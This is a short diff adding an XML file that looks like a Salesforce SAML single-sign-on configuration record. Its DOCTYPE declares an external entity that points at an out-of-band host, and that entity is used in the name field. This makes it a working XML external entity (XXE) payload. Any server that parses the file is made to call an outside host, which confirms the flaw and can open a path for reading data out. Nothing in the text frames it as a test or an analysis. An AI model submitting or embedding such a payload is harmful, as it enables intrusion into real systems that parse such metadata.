@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE r [ <!ENTITY gsx SYSTEM "https://oob.binary-man.in/xxewide/samlssoconfig"> ]>
+<SamlSsoConfig xmlns="http://soap.sforce.com/2006/04/metadata"><name>&gsx;</name><issuer>x</issuer><loginUrl>https://example.com</loginUrl></SamlSsoConfig>
